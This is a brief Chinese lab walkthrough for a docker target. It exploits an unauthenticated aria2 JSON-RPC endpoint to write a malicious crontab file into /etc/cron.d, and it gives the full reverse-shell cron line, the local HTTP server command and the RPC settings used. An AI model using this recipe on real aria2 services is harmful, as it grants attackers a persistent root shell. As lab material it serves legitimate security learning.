启动靶场：
```
docker compose up -d
```
先访问页面：
```
http://localhost:6800
```
发现服务已启动且返回404页面

需要借助第三方UI来实现下载文件：
```
http://binux.github.io/yaaw/demo/
```
现在先在文件夹内创建一个文件名为shell的恶意crontab文件
填写反弹shell代码：
```
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/0.250.250.254/4444 0>&1'
```
然后点击配置按钮：
输入aria2的目标域名：
```
http://localhost:6800/jsonrpc
```
于此同时先起一个HTTP服务：
```
python3 -m http.server 8000
```
然后点击add
- URL: `http://host.docker.internal:8000/shell`
- Dir: `/etc/cron.d`
- File Name: `shell`
这是需要填写的
然后即可反弹shell


